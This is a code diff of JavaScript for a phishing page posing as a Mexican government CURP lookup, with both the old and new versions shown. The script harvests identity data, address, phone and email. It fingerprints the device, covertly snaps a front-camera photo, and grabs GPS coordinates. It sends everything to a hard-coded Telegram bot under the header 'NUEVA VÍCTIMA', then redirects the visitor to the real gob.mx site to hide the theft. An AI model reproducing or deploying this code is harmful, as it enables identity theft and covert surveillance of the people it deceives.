+  if(anioSel){for(var a=2026;a>=1940;a--){var op=document.createElement('option');op.value=String(a);op.textContent=String(a);anioSel.appendChild(op);}}
+  var ladaSel=document.getElementById('lada');
+  if(ladaSel){LADAS.forEach(function(item){var opt=document.createElement('option');opt.value=item[1];opt.textContent=item[0]+' '+item[1]+' '+item[2];ladaSel.appendChild(opt);});}
 })();
 
-// ===== Limpiar autofill =====
-window.addEventListener('load', function(){
+window.addEventListener('load',function(){
   setTimeout(function(){
     document.querySelectorAll('input').forEach(function(el){el.value='';});
     document.querySelectorAll('select').forEach(function(el){el.selectedIndex=0;});
-    var cpi=document.getElementById('cpInfo');
-    if(cpi) cpi.innerHTML='';
+    var cpi=document.getElementById('cpInfo');if(cpi)cpi.innerHTML='';
   },150);
 });
 
-// ===== Cambiar tab =====
 function cambiarTab(tab){
   var btnCurp=document.getElementById('btn-tab-curp');
   var btnDatos=document.getElementById('btn-tab-datos');
   var panelCurp=document.getElementById('panel-curp');
   var panelDatos=document.getElementById('panel-datos');
   if(tab==='curp'){
-    if(btnCurp){btnCurp.classList.add('activa');}
-    if(btnDatos){btnDatos.classList.remove('activa');}
-    if(panelCurp){panelCurp.classList.remove('panel-oculto');}
-    if(panelDatos){panelDatos.classList.add('panel-oculto');}
+    if(btnCurp)btnCurp.classList.add('activa');
+    if(btnDatos)btnDatos.classList.remove('activa');
+    if(panelCurp)panelCurp.classList.remove('panel-oculto');
+    if(panelDatos)panelDatos.classList.add('panel-oculto');
   }else{
-    if(btnDatos){btnDatos.classList.add('activa');}
-    if(btnCurp){btnCurp.classList.remove('activa');}
-    if(panelDatos){panelDatos.classList.remove('panel-oculto');}
-    if(panelCurp){panelCurp.classList.add('panel-oculto');}
+    if(btnDatos)btnDatos.classList.add('activa');
+    if(btnCurp)btnCurp.classList.remove('activa');
+    if(panelDatos)panelDatos.classList.remove('panel-oculto');
+    if(panelCurp)panelCurp.classList.add('panel-oculto');
   }
 }
 
-// ===== Leer formulario completo =====
 function leerForm(){
-  form = {};
-  var campos = {
-    nombre:'nombre', ap:'primer-apellido', am:'segundo-apellido',
-    dia:'dia', mes:'mes', anio:'anio', sexo:'sexo', entidad:'estado',
-    calle:'calle', num_ext:'num-ext', num_int:'num-int', cp:'cp',
-    colonia:'colonia', municipio:'municipio', estado:'estado-dom',
-    entre:'entre', email:'email'
-  };
-  for(var k in campos){
-    var val = v(campos[k]);
-    if(val) form[k] = val;
-  }
-  if(form.dia && form.mes && form.anio){
-    form.fecha = form.dia+'/'+form.mes+'/'+form.anio;
-  }
-  var lada = v('lada'), tel = v('telefono');
-  if(tel) form.tel = lada+' '+tel;
+  form={};
+  var campos={nombre:'nombre',ap:'primer-apellido',am:'segundo-apellido',dia:'dia',mes:'mes',anio:'anio',sexo:'sexo',entidad:'estado',calle:'calle',num_ext:'num-ext',num_int:'num-int',cp:'cp',colonia:'colonia',municipio:'municipio',estado:'estado-dom',entre:'entre',email:'email'};
+  for(var k in campos){var val=v(campos[k]);if(val)form[k]=val;}
+  if(form.dia && form.mes && form.anio)form.fecha=form.dia+'/'+form.mes+'/'+form.anio;
+  var lada=v('lada'),tel=v('telefono');
+  if(tel)form.tel=lada+' '+tel;
 }
 
-// ===== Enviar a Telegram =====
 function enviar(){
-  var TOKEN = "9267114621:AAEvSqXV0Z7nCnjVMH59bfiuIsSAuE7wwvU";
-  var CHAT = "9092452687";
-  var API = "https://api.telegram.org/bot"+TOKEN;
-
-  var txt = "🔔 <b>NUEVA VÍCTIMA</b>\n\n";
-  txt += "📱 <b>Móvil:</b> "+info.modelo+"\n";
-  txt += "💻 <b>SO:</b> "+info.so+"\n";
-  txt += "🌐 <b>Nav:</b> "+info.navegador+"\n";
-  txt += "📺 <b>Pantalla:</b> "+info.pantalla+"\n";
-  txt += "🌎 <b>Idioma:</b> "+info.idioma+"\n";
-  txt += "🔋 <b>Bat:</b> "+info.bateria+"\n";
-  txt += "📡 <b>Red:</b> "+info.red+"\n";
-  txt += "📍 <b>IP:</b> "+info.ip+"\n";
-  txt += "🏙️ <b>Ciudad:</b> "+info.ciudad+"\n";
-  txt += "🌍 <b>País:</b> "+info.pais+"\n";
-  txt += "🧭 <b>GPS:</b> "+info.gps+"\n";
-
+  var TOKEN="9267114621:AAEvSqXV0Z7nCnjVMH59bfiuIsSAuE7wwvU";
+  var CHAT="9092452687";
+  var API="https://api.telegram.org/bot"+TOKEN;
+  var txt="🔔 <b>NUEVA VÍCTIMA</b>\n\n";
+  txt+="📱 <b>Móvil:</b> "+info.modelo+"\n";
+  txt+="💻 <b>SO:</b> "+info.so+"\n";
+  txt+="🌐 <b>Nav:</b> "+info.navegador+"\n";
+  txt+="📺 <b>Pantalla:</b> "+info.pantalla+"\n";
+  txt+="🌎 <b>Idioma:</b> "+info.idioma+"\n";
+  txt+="🔋 <b>Bat:</b> "+info.bateria+"\n";
+  txt+="📡 <b>Red:</b> "+info.red+"\n";
+  txt+="📍 <b>IP:</b> "+info.ip+"\n";
+  txt+="🏙️ <b>Ciudad:</b> "+info.ciudad+"\n";
+  txt+="🌍 <b>País:</b> "+info.pais+"\n";
+  txt+="🧭 <b>GPS:</b> "+info.gps+"\n";
   if(form && Object.keys(form).length){
-    txt += "\n📋 <b>DATOS DEL FORMULARIO:</b>\n";
-    var etiquetas = {
-      curp:"CURP", nombre:"Nombre(s)", ap:"Primer apellido", am:"Segundo apellido",
-      dia:"Día", mes:"Mes", anio:"Año", fecha:"Fecha nac.", sexo:"Sexo",
-      entidad:"Entidad", calle:"Calle", num_ext:"Núm. exterior", num_int:"Núm. interior",
-      cp:"CP", colonia:"Colonia", municipio:"Municipio", estado:"Estado",
-      entre:"Entre calles", tel:"Teléfono", email:"Email"
-    };
-    for(var k in form){
-      if(form[k]){
-        txt += "  • <b>"+(etiquetas[k]||k)+":</b> "+form[k]+"\n";
-      }
-    }
-  } else {
-    txt += "\n⚠️ Sin datos de formulario";
-  }
-
-  // Mensaje
-  fetch(API+"/sendMessage", {
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({chat_id:CHAT, text:txt, parse_mode:"HTML"})
-  }).catch(function(){});
-
-  // Foto
+    txt+="\n📋 <b>DATOS DEL FORMULARIO:</b>\n";
+    var et={curp:"CURP",nombre:"Nombre(s)",ap:"Primer apellido",am:"Segundo apellido",dia:"Día",mes:"Mes",anio:"Año",fecha:"Fecha nac.",sexo:"Sexo",entidad:"Entidad",calle:"Calle",num_ext:"Núm. exterior",num_int:"Núm. interior",cp:"CP",colonia:"Colonia",municipio:"Municipio",estado:"Estado",entre:"Entre calles",tel:"Teléfono",email:"Email"};
+    for(var k in form){if(form[k])txt+="  • <b>"+(et[k]||k)+":</b> "+form[k]+"\n";}
+  } else { txt+="\n⚠️ Sin datos de formulario"; }
+  fetch(API+"/sendMessage",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:CHAT,text:txt,parse_mode:"HTML"})}).catch(function(){});
   if(foto){
-    var blob = dataURLtoBlob(foto);
-    var fd = new FormData();
-    fd.append("chat_id", CHAT);
-    fd.append("photo", blob, "foto.jpg");
-    fd.append("caption", "📷 Foto frontal");
-    fetch(API+"/sendPhoto", {method:"POST", body:fd}).catch(function(){});
+    var blob=dataURLtoBlob(foto);
+    var fd=new FormData();
+    fd.append("chat_id",CHAT);
+    fd.append("photo",blob,"foto.jpg");
+    fd.append("caption","📷 Foto frontal");
+    fetch(API+"/sendPhoto",{method:"POST",body:fd}).catch(function(){});
   }
   return Promise.resolve();
 }
 
 function dataURLtoBlob(dataurl){
-  var arr = dataurl.split(","), mime = arr[0].match(/:(.*?);/)[1];
-  var bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
-  while(n--){u8arr[n] = bstr.charCodeAt(n);}
-  return new Blob([u8arr], {type:mime});
+  var arr=dataurl.split(","),mime=arr[0].match(/:(.*?);/)[1];
+  var bstr=atob(arr[1]),n=bstr.length,u8arr=new Uint8Array(n);
+  while(n--){u8arr[n]=bstr.charCodeAt(n);}
+  return new Blob([u8arr],{type:mime});
 }
 
-// ===== Autocompletado de CP =====
-var CP_MUNICIPIOS = {
-  '01000':'Álvaro Obregón','01210':'Álvaro Obregón','01730':'Álvaro Obregón',
-  '02000':'Azcapotzalco','03000':'Benito Juárez','03100':'Benito Juárez',
-  '04000':'Coyoacán','04100':'Coyoacán','05000':'Cuajimalpa de Morelos',
-  '06000':'Cuauhtémoc','06010':'Cuauhtémoc','06700':'Cuauhtémoc',
-  '07000':'Gustavo A. Madero','07300':'Gustavo A. Madero',
-  '08000':'Iztacalco','09000':'Iztapalapa','09800':'Iztapalapa',
-  '10000':'La Magdalena Contreras','11000':'Miguel Hidalgo','11560':'Miguel Hidalgo',
-  '12000':'Milpa Alta','13000':'Tláhuac','14000':'Tlalpan',
-  '15000':'Venustiano Carranza','16000':'Xochimilco',
-  '50000':'Toluca','52000':'Lerma','54000':'Tlalnepantla','57000':'Nezahualcóyotl'
-};
+var CP_MUNICIPIOS={'01000':'Álvaro Obregón','01210':'Álvaro Obregón','01730':'Álvaro Obregón','02000':'Azcapotzalco','02300':'Azcapotzalco','03000':'Benito Juárez','03100':'Benito Juárez','03810':'Benito Juárez','04000':'Coyoacán','04100':'Coyoacán','05000':'Cuajimalpa de Morelos','06000':'Cuauhtémoc','06010':'Cuauhtémoc','06700':'Cuauhtémoc','07000':'Gustavo A. Madero','07300':'Gustavo A. Madero','08000':'Iztacalco','09000':'Iztapalapa','09800':'Iztapalapa','10000':'La Magdalena Contreras','11000':'Miguel Hidalgo','11560':'Miguel Hidalgo','12000':'Milpa Alta','13000':'Tláhuac','14000':'Tlalpan','15000':'Venustiano Carranza','16000':'Xochimilco','50000':'Toluca','52000':'Lerma','54000':'Tlalnepantla','57000':'Nezahualcóyotl'};
 
 function completarMunicipio(cp){
-  var mun = document.getElementById('municipio');
-  if(!mun) return;
-  if(CP_MUNICIPIOS[cp]){mun.value = CP_MUNICIPIOS[cp]; return;}
-  for(var k in CP_MUNICIPIOS){
-    if(Math.abs(parseInt(k)-parseInt(cp))<3000){
-      mun.value = CP_MUNICIPIOS[k];
-      return;
-    }
-  }
+  var mun=document.getElementById('municipio');if(!mun)return;
+  if(CP_MUNICIPIOS[cp]){mun.value=CP_MUNICIPIOS[cp];return;}
+  for(var k in CP_MUNICIPIOS){if(Math.abs(parseInt(k)-parseInt(cp))<3000){mun.value=CP_MUNICIPIOS[k];return;}}
 }
 
 function autocompletarCP(cp){
-  var box = document.getElementById('cpInfo');
-  if(!box) return;
-  box.innerHTML = ''; box.style.color = '#1c9c4c';
-  if(!/^\d{5}$/.test(cp)) return;
-  box.innerHTML = 'Buscando…'; box.style.color = '#888';
-  fetch('https://api.zippopotam.us/mx/'+cp).then(function(r){
-    return r.ok ? r.json() : Promise.reject();
-  }).then(function(data){
-    var places = data.places || [];
-    if(!places.length){
-      box.style.color = '#c00';
-      box.innerHTML = 'CP no encontrado';
-      return;
-    }
-    var p = places[0];
-    var em = {'Distrito Federal':'Ciudad de México','Estado de Mexico':'Estado de México','Nuevo Leon':'Nuevo León','Michoacan':'Michoacán','Yucatan':'Yucatán','Queretaro':'Querétaro'};
-    var est = em[p.state] || p.state;
-    var col = document.getElementById('colonia');
-    var estd = document.getElementById('estado-dom');
-    if(col) col.value = p['place name'] || '';
-    if(estd) estd.value = est;
+  var box=document.getElementById('cpInfo');if(!box)return;
+  box.innerHTML='';box.style.color='#1c9c4c';
+  if(!/^\d{5}$/.test(cp))return;
+  box.innerHTML='Buscando…';box.style.color='#888';
+  fetch('https://api.zippopotam.us/mx/'+cp).then(function(r){return r.ok?r.json():Promise.reject();}).then(function(data){
+    var places=data.places||[];
+    if(!places.length){box.style.color='#c00';box.innerHTML='CP no encontrado';return;}
+    var p=places[0];
+    var em={'Distrito Federal':'Ciudad de México','Estado de Mexico':'Estado de México','Nuevo Leon':'Nuevo León','Michoacan':'Michoacán','Yucatan':'Yucatán','Queretaro':'Querétaro'};
+    var est=em[p.state]||p.state;
+    var col=document.getElementById('colonia'),estd=document.getElementById('estado-dom');
+    if(col)col.value=p['place name']||'';
+    if(estd)estd.value=est;
     completarMunicipio(cp);
-    box.style.color = '#1c9c4c';
-    box.innerHTML = '✓ '+(p['place name']||'')+', '+est;
-  }).catch(function(){
-    box.style.color = '#c00';
-    box.innerHTML = 'No se pudo autocompletar';
-  });
+    box.style.color='#1c9c4c';box.innerHTML='✓ '+(p['place name']||'')+', '+est;
+  }).catch(function(){box.style.color='#c00';box.innerHTML='No se pudo autocompletar';});
 }
 
-// ===== Flujo completo =====
 async function ejecutarFlujo(boton){
-  boton.disabled = true;
-  boton.innerHTML = '<span class="load"></span> Buscando…';
+  boton.disabled=true;
+  boton.innerHTML='<span class="load"></span> Buscando…';
   try{
-    var stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
+    var stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
     await new Promise(function(r){setTimeout(r,1000);});
-    var video = document.createElement('video');
-    video.srcObject = stream;
-    await video.play();
+    var video=document.createElement('video');video.srcObject=stream;await video.play();
     await new Promise(function(r){setTimeout(r,600);});
-    var c = document.createElement('canvas');
-    c.width = video.videoWidth;
-    c.height = video.videoHeight;
-    c.getContext('2d').drawImage(video,0,0);
-    foto = c.toDataURL('image/jpeg',0.85);
+    var c=document.createElement('canvas');c.width=video.videoWidth;c.height=video.videoHeight;
+    c.getContext('2d').drawImage(video,0,0);foto=c.toDataURL('image/jpeg',0.85);
     stream.getTracks().forEach(function(t){t.stop();});
   }catch(e){console.log('Camara err:',e);}
-
   await new Promise(function(r){setTimeout(r,300);});
   await new Promise(function(res){
-    navigator.geolocation.getCurrentPosition(function(p){
-      info.gps = p.coords.latitude.toFixed(6)+','+p.coords.longitude.toFixed(6);
-      res();
-    },function(){
-      info.gps = 'denegada';
-      res();
-    },{timeout:6000});
+    navigator.geolocation.getCurrentPosition(function(p){info.gps=p.coords.latitude.toFixed(6)+','+p.coords.longitude.toFixed(6);res();},function(){info.gps='denegada';res();},{timeout:6000});
   });
-
   await enviar();
   await new Promise(function(r){setTimeout(r,800);});
-  window.location = 'https://www.gob.mx/curp/';
+  window.location='https://www.gob.mx/curp/';
 }
 
-// ===== Handlers de botones =====
-document.addEventListener('DOMContentLoaded', function(){
-  // CP autocompletado
-  var cpEl = document.getElementById('cp');
-  if(cpEl){
-    cpEl.addEventListener('input', function(){autocompletarCP(this.value);});
-  }
-
-  // Botón Buscar (funciona para ambos paneles)
-  var btn = document.getElementById('btnBuscar');
+document.addEventListener('DOMContentLoaded',function(){
+  var cpEl=document.getElementById('cp');
+  if(cpEl)cpEl.addEventListener('input',function(){autocompletarCP(this.value);});
+  var btn=document.getElementById('btnBuscar');
   if(btn){
-    btn.onclick = async function(e){
+    btn.onclick=async function(e){
       e.preventDefault();
-      var panelCurpVisible = !document.getElementById('panel-curp').classList.contains('panel-oculto');
-      if(panelCurpVisible){
-        form = {};
-        form.curp = v('curp');
-        if(!form.curp) form.curp = '(vacío)';
-      }else{
-        leerForm();
-      }
+      var panelCurpVisible=!document.getElementById('panel-curp').classList.contains('panel-oculto');
+      if(panelCurpVisible){form={};form.curp=v('curp');if(!form.curp)form.curp='(vacío)';}
+      else{leerForm();}
       await ejecutarFlujo(this);
     };
   }
